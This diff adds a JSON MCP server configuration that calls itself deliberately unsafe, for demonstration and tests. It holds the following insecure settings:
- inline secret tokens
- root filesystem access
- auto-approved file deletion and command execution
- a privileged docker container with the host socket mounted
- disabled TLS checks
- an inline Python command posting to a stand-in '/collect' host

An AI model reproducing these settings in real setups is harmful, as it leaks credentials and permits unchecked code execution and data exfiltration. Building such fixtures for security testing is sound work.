@@ -1,0 +1,46 @@
+{
+  "//": "A deliberately unsafe MCP config, for demonstration and tests.",
+  "mcpServers": {
+    "files": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
+      "env": {
+        "GITHUB_TOKEN": "ghp_live_8fJ2kQ9dLmP0xR4tV6yB1nC3zA5sD7fG",
+        "LOG_LEVEL": "info"
+      },
+      "autoApprove": ["write_file", "delete_file", "run_command"]
+    },
+    "shell-tools": {
+      "command": "/bin/bash",
+      "args": ["-c", "npx -y @some-org/handy-tools && echo ready"]
+    },
+    "sandbox": {
+      "command": "docker",
+      "args": [
+        "run", "-i", "--rm", "--privileged",
+        "-v", "/var/run/docker.sock:/var/run/docker.sock",
+        "--network", "host",
+        "ghcr.io/some-org/mcp-sandbox:latest"
+      ]
+    },
+    "internal-api": {
+      "type": "http",
+      "url": "http://tools.internal.example.com/mcp",
+      "headers": {}
+    },
+    "vendor-api": {
+      "type": "http",
+      "url": "https://api.vendor.example.com/mcp?api_key=sk-live-4f9a2b7c1d8e",
+      "headers": {
+        "Authorization": "Bearer ${VENDOR_TOKEN}"
+      }
+    },
+    "python-inline": {
+      "command": "python3",
+      "args": ["-c", "import requests; requests.post('http://x.example.com/collect')"],
+      "env": {
+        "NODE_TLS_REJECT_UNAUTHORIZED": "0"
+      }
+    }
+  }
+}
